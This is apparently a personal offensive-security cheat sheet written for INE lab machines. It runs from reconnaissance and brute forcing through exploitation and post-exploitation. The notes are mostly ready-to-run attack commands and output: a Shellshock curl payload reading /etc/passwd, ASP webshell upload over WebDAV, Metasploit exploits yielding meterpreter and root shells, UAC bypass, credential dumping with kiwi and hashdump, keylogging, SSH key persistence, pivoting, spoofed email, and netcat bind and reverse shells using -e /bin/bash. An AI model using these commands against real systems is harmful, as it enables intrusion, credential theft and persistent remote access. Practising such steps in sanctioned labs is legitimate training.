## **first check 

```
/robots.txt
```

_____

## **check whatweb technologies

```
whatweb http://target.ine.local
```

__________

## **offline download using httrack

```
httrack http:target.ine.local -O target
```

------------

## **directory fuzzing 

use dirb or ffuf or durbuster anything 

```
dirb http://target.ine.local  
```

## **check useful accessable directory.

and 

spraying wordlist and find all extensions files ex: .bak , .php etc ...

```
**dirb** [**http://target.ine.local**](http://target.ine.local) **-w /usr/share/dirb/wordlists/big.txt -X .bak,.tar.gz,.zip,.sql,.bak.zip**
```
____________


## **first check active hosts 

## **using fping 
```
fping -a -g  192.11.144.46
```
or 
## **using nmap 
```
nmap -sn 192.11.144.46
```


## **check "OS" and "VERSION" and "DEFAULT NSE SCRIPTS"
```
sudo nmap -sS -A -p- -T4  192.11.144.46
```


____________

## **CHECK FOR ANAONYMOUS FPT LOGIN 

if FTP port open
```
ftp anonymous@192.191.214.2
```

if u find any credentials spray or try in all open port services
like mysql,ftp,etc....


________________________

Use NSE scripts on open port 

example:

## **Windows Recon - SMB Nmap Scripts
```
sudo nmap -Pn -T4 -A  -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771  demo.ine.local
```

nmap scripts list 
```
ls /usr/share/nmap/script/smb | grep smb
```

_____________________________________________________________
### **F T P  Enumeration

Try all NSE Scripts
```
sudo nmap -Pn -p21 --script "ftp-*" -sV demo.ine.local
```

VERSION 
```
use auxiliary/scanner/ftp/ftp_version
```

TRY Brute force
```
use auxiliary/scanner/ftp/ftp_login
```

TRY ANONMOUS LOGIN
```
use auxiliary/scanner/ftp/anonymous
```

______________

## **S M B server reconnaissance

IF ANONYMOUS LOGIN
USE 
```
enum4linux -a demo.ine.local
```

TRY `SMBMAP`
```
smbmap -H target.ine.local -u '' -p ''
```

TRY NULL LOGIN
```
smbclient -L demo.ine.local -N
```

**ENUM ANONY ACCESS 
```
#!/bin/bash  
  
# Define the target and wordlist location  
TARGET="target.ine.local"  
WORDLIST="/root/Desktop/wordlists/shares.txt"  
  
# Check if the wordlist file exists  
if [ ! -f "$WORDLIST" ]; then  
    echo "Wordlist not found: $WORDLIST"  
    exit 1  
fi  
  
# Loop through each share in the wordlist  
while read -r SHARE; do  
    echo "Testing share: $SHARE"  
    smbclient //$TARGET/$SHARE -N -c "ls" &>/dev/null  
  
    if [ $? -eq 0 ]; then  
        echo "[+] Anonymous access allowed for: $SHARE"  
    else  
        echo "[-] Access denied for: $SHARE"  
    fi  
done < "$WORDLIST"
```

queries `NetBIOS`names and maps them to IP addresses in a network, using NBT
```
nmblookup -A demo.ine.local
```


ALL IN ONE 
```
sudo nmap -Pn -script "smb-*" -sV -O -p445 demo.ine.local
```

Using` rpcclient` determine whether anonymous connection (null session) is allowed on the samba server or not

```
rpcclient -U "" -N demo.ine.local
```

___________________
#### **Apache Enumeration

```
- auxiliary/scanner/http/apache_userdir_enum
- auxiliary/scanner/http/brute_dirs
- auxiliary/scanner/http/dir_scanner
- auxiliary/scanner/http/dir_listing
- auxiliary/scanner/http/http_put
- auxiliary/scanner/http/files_dir
- auxiliary/scanner/http/http_login
- auxiliary/scanner/http/http_header
- auxiliary/scanner/http/http_version
- auxiliary/scanner/http/robots_txt
```

________________

## IIS Server DAVTest

first search for  /dav directory

```
nmap --script http-enum -sV -p 80 demo.ine.local
```

using gobuster , dirb , ffuf , nikto etc

```
dirb http://demo.ine.local
```

```
└─# davtest -url demo.ine.local -auth bob:password_123321
```

```

this tool check uplaod and exec files

in this case



EXEC    asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_YswY_DeO0bQTcO/davtest_YswY_DeO0bQTcO.asp                                                                   
          
EXEC    txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_YswY_DeO0bQTcO/davtest_YswY_DeO0bQTcO.txt                                                                   
 
EXEC    html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_YswY_DeO0bQTcO/davtest_YswY_DeO0bQTcO.html                                                                  
```

so we use webshell with .aspx

```
/usr/share/webshells/asp/webshell.asp
```

Upload a .asp backdoor on the target machine to /webdav directory using `cadaver utility.

```
cadaver http://demo.ine.local/webdav
```

```
Authentication required for demo.ine.local on server `demo.ine.local':
Username: bob
Password: 
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.
dav:/webdav/> 

```

access web shell at cadaver http://demo.ine.local/webdav
Authentication required .

OR 

**USE METASPLOIT

```
use exploit/windows/iis/iis_webdav_upload_asp
```

___________________________________________


## **SHELL SHOCK

check if this cgi is vulnable for shellshock

```
└─# sudo nmap -Pn -p80 --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" -sV -O demo.ine.local  
```                                                            

use this 

```
use auxiliary/scanner/http/apache_mod_cgi_bash_env
```

or use BURP SUIT

AS PAYLOAD IN PLACE OF `USER_AGENT`
```
user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" 
```

or
 
```
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://demo.ine.local:80/gettime.cgi
```

**OUTPUT:

**root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false

_______________________

## WMAP - metasploit

FIRST LOAD

```
load wmap
```

add sites

```
wmap_sites -a <ip>
```

add target

```
wmap_target -t http://deo.ine.local
```

list a match modules

```
wmap_run -t
```

exec match modules
```
wmap-run -e
```

__________________

## **SMB SERVER PSExec

to access SMB we  require username and password

so try Brute force

USE HYDRA
```
hydra -L /usr/share/metasploit-frameworl/data/wordlist/common_user.txt -P /usr/share/metasploit-frameworl/data/wordlist/unix_password.txt smb://target.ine.local:445
```

OR

USE PSExec From Metasploit

```
use exploit/windows/smb/psexec
```

_______________________

## **RDP Service

use

```
use auxiliary/scanner/rdp/rdp_Scanner
```

and set PORT


after u can try brute force using `Hydra`

then use x`freerdp` tool to get RDP 

_____________

## **WINRM Exploit 

when u find service = wsman

that is winrm

```
use auxiliary/scanner/winrm/winrm_login
```

set RHOSTS
set PORT
set USER_FILE
set PASS_FILE

then u get vaild credentials

ok check is winrm service have authentication
```
use auxiliary/scanner/winrm/winrm_auth_method
```

if yes

then we need a shell right ? so use

```
use exploit/windows/winrm/winrm_script_exec
```

and 

set FORCE_VBS true

u get meterpreter shell

________________________

## **UAC Bypass: UACMe

path : /root/Desktop/tools/UACME/Akagi64.exe

+ First upload to target

+ then enum systeminfo

+ for windows 10 

+ Akagi64.exe 23-63 (command)

+ In my case is uploaded payload to get reverse shell

+ first create payload using MFSVENOM

+ Upload to target

```
Akagi64.exe 23 C:\\TEMP\\backdoor.exe
```


#### UAC Bypass: Memory Injection (Metasploit)

```
use exploit/windows/local/bypassuac_injection
set session 1
set TARGET 1
```

________________________

## **IMPERSONATE ACCESS TOKEN

after we got meterpreter shell

use 
```
load incognito

list_tokens -u
```

to get token

```
impersonate_token (name)
```

u can check by
```
getuid
```

____________________

## **WINDOWS Unattended install

after we got foothold

upload  powerup.ps1 to target

then 

```
powershell -ep bypass

 . ./powerup.ps1

Invoke-PrivescAudit
```

then  i shows potentials files to prives

then we find creds.


use that cred to get administrative cmd

```
runas.exe /user:administratro cmd
password:

```

we get cmd as administrator

now use

```
use exploit/windows/misc/hta_server
```

we get url

in target cmd

```
mshta.exe copy url 
```

then we get reverse shell
___________
## KIWI - post EXPLOITATION

after we got meterpreter shell

migrate into lsass.exe proces

then 

```
load kiwi
```

```
creds_all
```

```
lsa_dump_sam
```

```
lsa_dump_secrets
```

________________

## PIVORTING 

afterwe got intial hold or meterpreter shelll

check 
```
ipconfig
```

see network range

ex:
```
IPv4 Address. . . . . . . . . . . : 10.5.20.248
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
```

```
run autoroute -S 10.5.20.0/20
```

now u have two options

## **PORTFORWARING or SOCKS PROXY

+ 1 use socks proxy modules

```
use auxiliary(server/socks_proxy
```
check your socks proxy 


```
**cat /etc/proxychains.conf**
```


set PORT 
set HOST 
set VERSION 4a

then u can 

```
proxychains nmap -sT -Pn -sC -sV -O dem1.ine.local
```

```
proxychains nmap -Pn -sV -sC -p445  -O demo1.ine.local                              
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-12 21:24 IST
Nmap scan report for demo1.ine.local (10.5.25.57)
Host is up.

PORT    STATE    SERVICE      VERSION
445/tcp filtered microsoft-ds

```

_____________
## **PORTFORWDING

in meterpreter

```
portfwd add -l 1234 -p 445 -r 10.5.25.57
```

-l mean local port 

-p mens target port

-r target ip

```
sudo nmap -Pn -sC -sV -O -p1234 localhost
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-12 21:37 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000041s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE      VERSION
1234/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds

```
____________
## SNMP (Simple Network Management Protocol)

#### UDP port 161 is open

- **Why is it crucial?** It identifies a potential entry point for attack and a rich source of information leakage.


#### The Important Caveat: "Double-check nmap results"

- **The Problem:** Firewalls can sometimes trick scanning tools like `nmap`. A firewall might be configured to respond to probes on port 161, making it _look_ open, but then block actual SNMP requests.
    
- **The Solution:** The author emphasizes that finding the port open is just the first clue. The real proof is if we can successfully communicate with the SNMP service using its own "language."

#### Finding the Key: "Discover the community string"

- **What is a Community String?** Think of it as a **password** to access the SNMP service. It's a simple, text-based authentication mechanism.
    
    - **`public`**: The default "read-only" community string. It lets you view a vast amount of system information but not change anything.
        
    - **`private`**: The default "read-write" community string (less common). This could allow an attacker to modify system settings.
        
- **How to find it?** The guide uses a "brute-force" method. The `nmap` script (`snmp-brute`) tries a long list of common passwords (from the file `snmpcommunities.lst`) against the SNMP service until one works. In this case, it found `public`, `private`, and `secret`.


#### Unlocking the Vault: "Run the snmpwalk tool"

- **What is `snmpwalk`?** This is the main tool for querying an SNMP service. Once you have a valid community string (like `public`), you can use `snmpwalk` to ask the device, "Tell me **everything** you know."
    
- **How does it work?** Information in an SNMP system is organized in a hierarchical tree structure, where every piece of data has a unique identifier called an **OID (Object Identifier)**. `snmpwalk` starts at the top of the tree (or a specified branch) and systematically "walks" down, requesting every single piece of information one by one.
    
- **The Command Explained:**
    
    - `snmpwalk -v 1 -c public demo.ine.local`
        
    - `-v 1`: Uses **SNMP version 1**, a very common (but insecure) version.
        
    - `-c public`: Uses the community string **`public`** we discovered.
        
    - `demo.ine.local`: The target machine.

____________
## Wireshark

What is the domain name(abcd.site) accessed by the infected user that returned a 200 OK response code?

```
http.responce.code == 200
```

What is the IP address, MAC address of the infected Windows client?

```
check in ethernet columns
```

Which Wireshark filter can you use to determine the victim’s hostname from NetBIOS Name Service traffic, and what is the detected hostname for this malware infection?

```
nbns , search for DTS(destination mac address)
```

Which user got infected and ran the mystery_file.ps1 PowerShell script?

```
ctrl + f 

select packet bytes + string mystery_file.ps1
```

What User-Agent string indicates the traffic generated by a PowerShell script?

```
ctrl + f 

select packet detailes + string powershell
```


Which wallet extension ID is associated with the Coinbase wallet?

```
ctrl + f 

sekect packet bytes + string coinbase

search data 
```

____________________
#### MySQL Enumeration

```
- auxiliary/scanner/mysql/mysql_version
- auxiliary/scanner/mysql/mysql_login
- auxiliary/admin/mysql/mysql_enum
- auxiliary/admin/mysql/mysql_sql
- auxiliary/scanner/mysql/mysql_file_enum
- auxiliary/scanner/mysql/mysql_hashdump
- auxiliary/scanner/mysql/mysql_schemadump
- auxiliary/scanner/mysql/mysql_writable_dirs
```


___________
#### SMTP server

```
nmap -sV -p25 -script banner demo.ine.local
```

hostname of the server (domain name).
```
openmailbox.xyz
```


**Does user "admin" exist on the server machine? Connect to SMTP service using netcat and check manually.

first connect using

netcat

```
nc demo.ine.local 25 
```

then 
```
VRFY admin@openmailbox.xyz
```


**Does user “commander” exist on the server machine? Connect to SMTP service using netcat and check manually.
```
nc demo.ine.local 25
220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.
VRFY commander@openmailbox.xyz
550 5.1.1 <commander@openmailbox.xyz>: Recipient address rejected: User unknown in local recipient table


```

What commands can be used to check the supported commands/capabilities? Connect to SMTP service using telnet and check.

```
telnet demo.ine.local 25                                                                                                                                                        
Trying 192.151.171.3...
Connected to demo.ine.local.
Escape character is '^]'.
220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.
HELLO attacker.xyz
502 5.5.2 Error: command not recognized
HELO attacker.xyz
250 openmailbox.xyz
EHLO attacker.xyz
250-openmailbox.xyz
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250 SMTPUTF8

```

How many of the common usernames present in the dictionary /usr/share/commix/src/txt/usernames.txt exist on the server. Use smtp-user-enum tool for this task.

```
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
```


**How many common usernames present in the dictionary /usr/share/metasploit-framework/data/wordlists/unix_users.txt exist on the server. Use suitable metasploit module for this task.
```
use auxiliary/scanner/smtp/smtp_enum
```

**Connect to SMTP service using telnet and send a fake mail to root user.

```
telnet demo.ine.local 25
Trying 192.151.171.3...
Connected to demo.ine.local.
Escape character is '^]'.
220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.
HELO attacker.xyz
250 openmailbox.xyz
mail from: admin@openmailbox.xyz
250 2.1.0 Ok
rcpt to: root@openmailbox.xyz
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
hello 
i hacked u
.
250 2.0.0 Ok: queued as 66E94783DA7

```

Send a fake mail to root user using sendemail command.
```
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```


___
#### Windows: Java Web Server

when i see
```
8080/tcp  open  http               Apache Tomcat 8.5.19
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.19

```

check exploit in searchsploit
```
─# searchsploit Apache Tomcat 8.5.19
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                    |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                      | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                      | jsp/webapps/42966.py
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

then search metasploit modules
```
search JSP Upload Bypass
use  exploit/multi/http/tomcat_jsp_upload_bypass    
```

_________

## MSSQLSERVER

port - 1433/tcp

first search 

```
searchsploit Microsoft SQL Server 2012
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                    |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft BizTalk Server 2000/2002 DTA - 'RawCustomSearchField.asp' SQL Injection                                                                 | asp/webapps/22555.txt
Microsoft BizTalk Server 2000/2002 DTA - 'rawdocdata.asp' SQL Injection                                                                           | asp/webapps/22554.txt
Microsoft SQL Server - Database Link Crawling Command Execution (Metasploit)                                                                      | windows/remote/23649.rb
Microsoft SQL Server 2000 - 'SQLXML' Buffer Overflow (PoC)                                                                                        | windows/dos/21540.txt
Microsoft SQL Server 2000 - Database Consistency Checkers Buffer Overflow                                                                         | windows/remote/21650.txt
Microsoft SQL Server 2000 - Password Encrypt procedure Buffer Overflow                                                                            | windows/local/21549.txt
Microsoft SQL Server 2000 - Resolution Service Heap Overflow                                                                                      | windows/remote/21652.cpp
Microsoft SQL Server 2000 - sp_MScopyscript SQL Injection                                                                                         | windows/remote/21651.txt
Microsoft SQL Server 2000 - SQLXML Script Injection                                                                                               | windows/remote/21541.txt
Microsoft SQL Server 2000 - User Authentication Remote Buffer Overflow                                                                            | windows/remote/21693.nasl
Microsoft SQL Server 2000 / Microsoft Jet 4.0 Engine - Unicode Buffer Overflow (PoC)                                                              | windows/dos/21569.txt
Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_displayparamstmt Buffer Overflow                                                        | windows/local/20451.c
Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_peekqueue Buffer Overflow                                                               | windows/local/20457.c
Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_showcolv Buffer Overflow                                                                | windows/local/20456.c
Microsoft SQL Server 7.0/2000 / MSDE - Named Pipe Denial of Service (MS03-031)                                                                    | windows/dos/22957.cpp
Microsoft SQL Server 7.0/2000 JET Database Engine 4.0 - Buffer Overrun                                                                            | windows/dos/22576.txt
Microsoft SQL Server 7.0/7.0 SP1 - NULL Data Denial of Service                                                                                    | windows/dos/19638.c
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

search in metasploit

```
msf6 > search Microsoft SQL Server 2012

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/windows/mssql/mssql_clr_payload      1999-01-01       excellent  Yes    Microsoft SQL Server Clr Stored Procedure Payload Execution
   1  exploit/windows/mssql/mssql_linkcrawler      2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   2  exploit/windows/mysql/mysql_start_up         2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows FILE Privilege Abuse
   3  exploit/windows/mysql/mysql_mof              2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows MOF Execution
   4  post/windows/manage/mssql_local_auth_bypass  .                normal     No     Windows Manage Local Microsoft SQL Server Authorization Bypass
```

```
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/mssql/mssql_clr_payload) > set RHOSTS target.ine.local
RHOSTS => target.ine.local
msf6 exploit(windows/mssql/mssql_clr_payload) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/mssql/mssql_clr_payload) > run

[*] Started reverse TCP handler on 10.10.36.2:4444 
[!] 10.5.24.104:1433 - Setting EXITFUNC to 'thread' so we don't kill SQL Server
[*] 10.5.24.104:1433 - Database does not have TRUSTWORTHY setting on, enabling ...
[*] 10.5.24.104:1433 - Database does not have CLR support enabled, enabling ...
[*] 10.5.24.104:1433 - Using version v3.5 of the Payload Assembly
[*] 10.5.24.104:1433 - Adding custom payload assembly ...
[*] 10.5.24.104:1433 - Exposing payload execution stored procedure ...
[*] 10.5.24.104:1433 - Executing the payload ...
[*] 10.5.24.104:1433 - Removing stored procedure ...
[*] 10.5.24.104:1433 - Removing assembly ...
[*] 10.5.24.104:1433 - Restoring CLR setting ...
[*] Sending stage (201798 bytes) to 10.5.24.104
[*] 10.5.24.104:1433 - Restoring Trustworthy setting ...
[*] Meterpreter session 1 opened (10.10.36.2:4444 -> 10.5.24.104:49447) at 2025-10-13 14:20:02 +0530

meterpreter > 

```

__________

## FIND SPECFIC FILE

```
search -f *.txt -d C:\\Windows\\System32
```

___________
## Linux Exploitation - Vulnerable FTP Server

## VSFTPD

port - 21/tcp open  ftp     vsftpd 2.3.4

```
nmap -p 21 --script vuln demo.ine.local
```

```
searchsploit vsftpd 2.3.4

 Exploit Title                                                                     
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                         | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                             

```

```
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.75.66.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.75.66.3:21 - USER: 331 Please specify the password.
[+] 192.75.66.3:21 - Backdoor service has been spawned, handling...
[+] 192.75.66.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.75.66.2:38231 -> 192.75.66.3:6200) at 2025-10-13 14:30:08 +0530

/bin/bash -i
bash: cannot set terminal process group (34): Inappropriate ioctl for device
bash: no job control in this shell
root@demo:~/vsftpd-2.3.4# 

```

_______
 
 
 ### **Vulnerable File Sharing Service

## samba (smb_ linux)


139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)

```
msf6 > search samba

use exploit/linux/samba/is_known_pipename
```

______________


22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)


```
searchsploit libssh

libSSH - Authentication Bypass                                                                                                                    | linux/remote/45638.py
LibSSH 0.7.6 / 0.8.4 - Unauthorized Access 

```

```
msf6 > search libssh

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/libssh_auth_bypass  2018-10-16       normal  No     libssh Authentication Bypass Scanner
   1    \_ action: Execute                      .                .       .      Execute a command
   2    \_ action: Shell                        .                .       .      Spawn a shell


Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/ssh/libssh_auth_bypass
After interacting with a module you can manually set a ACTION with set ACTION 'Shell'

msf6 > use 0
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > show options

Module options (auxiliary/scanner/ssh/libssh_auth_bypass):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CHECK_BANNER   true             no        Check banner for libssh
   CMD                             no        Command or alternative shell
   CreateSession  true             no        Create a new session for every successful login
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          22               yes       The target port
   SPAWN_PTY      false            no        Spawn a PTY
   THREADS        1                yes       The number of concurrent threads (max one per host)


Auxiliary action:

   Name   Description
   ----   -----------
   Shell  Spawn a shell



View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set CMD true
CMD => true
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > run

[*] 192.95.134.3:22 - Attempting authentication bypass
[*] Attempting "Shell" Action, see "show actions" for more details
[*] Error: 192.95.134.3: IOError closed stream
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions

Active sessions
===============

  Id  Name  Type   Information  Connection
  --  ----  ----   -----------  ----------
  1         shell               192.95.134.2:43511 -> 192.95.134.3:22 (192.95.134.3)

```

________

#### SMTP Server
## Haraka

25/tcp open  smtp    Haraka smtpd 2.8.8

```
msfconsole -q

use exploit/linux/smtp/haraka
set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set rhost demo.ine.local
set LHOST 192.164.31.2
exploit
```

____________

## RSYNC 

**`rsync`** (remote sync) is a **fast, efficient file-copying and synchronization tool** used in Linux/Unix systems

ou can sync files:

- **Local → Local**  
    `rsync /home/user/docs/ /mnt/backup/docs/`
    
- **Local → Remote**  
    `rsync /home/user/docs/ user@server:/backup/docs/`
    
- **Remote → Local**  
    `rsync user@server:/backup/docs/ /home/user/docs/`


Try listing modules (shared directories):
```
rsync target1.ine.local::
```

```
rsync target1.ine.local::
backupwscohen   FLAG1_7ec6dbe5d10a4e78abdcfff9645efffb
```

now to donwload or sync

```
rsync -av target1.ine.local::backupwscohen ./nana
receiving incremental file list
created directory ./nana
./
TPSData.txt
office_staff.vhd
pii_data.xlsx

sent 84 bytes  received 341 bytes  850.00 bytes/sec
total size is 84  speedup is 0.20
```

__________

## Roxy-WI

```
sudo nmap -Pn -sC -sV -O target2.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-13 16:58 IST
Nmap scan report for target2.ine.local (192.131.102.4)
Host is up (0.000082s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Roxy-WI
|_http-server-header: Apache/2.4.52 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.52

```

```
msf6 > search Roxy-WI

Matching Modules
================

   #  Name                             Disclosure Date  Rank       Check  Description
   -  ----                             ---------------  ----       -----  -----------
   0  exploit/linux/http/roxy_wi_exec  2022-07-06       excellent  Yes    Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE
   1    \_ target: Unix (In-Memory)    .                .          .      .
   2    \_
   
 target: Linux (Dropper)  
```


__________________

Check the PATH environment variable on the remote machine.

```
getenv PATH
```

__________
## Windows Post Exploitation

we can use is the **enum_logged_on_users** which as the name suggests, enumerates a list of currently and previous logged on users. Run the module:
```
use post/windows/gather/enum_logged_on_users
```


the target system is a virtual machine by leveraging a module called **checkvm**.

```
use post/windows/gather/checkvm
```

**enum_applications** module. This module enumerates a list of installed application/programs on the target system
```
use post/windows/gather/enum_applications
```

**enum_computers** module to enumerate a list of computers connected to the same LAN that the target is a part of. Try running the module:
```
use post/windows/gather/enum_computers
```

**enum_shares** module.
```
use post/windows/gather/enum_shares
```

________________
#### Windows: Enabling Remote Desktop

```
use post/windows/manage/enable_rdp
```



________

Running keyscan_start to capture keystrokes.
```
keyscan_start
```

Dump the keylogger data.
```
keyscan_dump
```

__________

## **Linux Post Exploitation

```
- post/linux/gather/enum_configs
- post/multi/gather/env
- post/linux/gather/enum_network
- post/linux/gather/enum_protections
- post/linux/gather/enum_system
- post/linux/gather/checkcontainer
- post/linux/gather/checkvm
- post/linux/gather/enum_users_history
- post/multi/manage/system_session
- post/linux/manage/download_exec
```

_____________

## ROOTKIT SCANNER

## **CHROOTKIT 

search 

from shell
```
ps aux
```

find for processs with

**/bin/bash /bin/check-down

cat /bin/check-down

command -V  chrootkit

cat /bin/chrootkit -V

```
use exploit/unix/local/chrootkit
```
_________________
## Post Exploitation Linux
```
- post/multi/gather/ssh_creds
- post/multi/gather/docker_creds
- post/linux/gather/hashdump
- post/linux/gather/ecryptfs_creds
- post/linux/gather/enum_psk
- post/linux/gather/enum_xchat
- post/linux/gather/phpmyadmin_credsteal
- post/linux/gather/pptpd_chap_secrets
- post/linux/manage/sshkey_persistence
  
```

_____________________

## Banner Grabbing

```
nmap -sV --script=banner 192.8.94.3
```

```
nc 192.8.94.3 22
```

```
nmap -sV -O 192.8.94.3
```

____________

## **Bind shell

1. **On the Target Machine:** You start `nc` in listen mode, telling it to execute a shell (`/bin/bash` or `cmd.exe`) when someone connects.
    
2. **On the Attacker Machine:** You use `nc` as a client to connect to the target's IP and the port it's listening on.

```
**Target (Linux):**

nc -lvp 4444 -e /bin/bash
```

- `-l`: Listen mode.
    
- `-v`: Verbose (so you see a connection come in).
    
- `-p 4444`: Port to listen on.
    
- `-e /bin/bash`: Execute the bash shell and connect it to the network stream.

```

**Attacker:**

nc 192.168.1.100 4444
```

_____________

### Reverse Shell



1. **On the Attacker Machine:** You start `nc` in listen mode on a specific port. It's just waiting for a connection; it's not executing anything yet.
    
2. **On the Target Machine:** You use `nc` to make an _outbound_ connection to the attacker's listener, and you tell it to pipe its local shell to that connection.

```
**Attacker (Sets up listener first):**

nc -lvp 4444
```

**Target (Initiates connection back):**
```
nc 192.168.1.50 4444 -e /bin/bash
```

________
## Processmaker

default credentials

admin:admin

and metasploit modules

```
use exploit/multi/http/processmaker_exec
```

_______________

## **FlatCore

seaechsploit flatcore

```
searchsploit -m 50262
```

exec

```
python3 50262.py http://target1.ine.local admin password1
```

we got shell

__________________________

## **wordpress


```
drib http://target2.ine.local
```

hint is there is a vuln plugin

```
gobuster dir -u http://target2.ine.local/wp-content/plugins -w /usr/share/nmap/nselib/data/wp-plugins.lit
```

then i found two plugin

+ duplicator
+ akismet

search metasploit

```
use exploit/multi/php/wp_duplicator_file_read
```

________________

## **IIS FTP & OPENSSH 

use hydra or ftp_login

```
hydra -L /usr/share/wordlist/metasploit/unix_users.txt -P /usr/share/wordlist/metasploit/unix_password.txt demo.ine.local ftp`
```

___________

## **MY SQL DATABASE

```
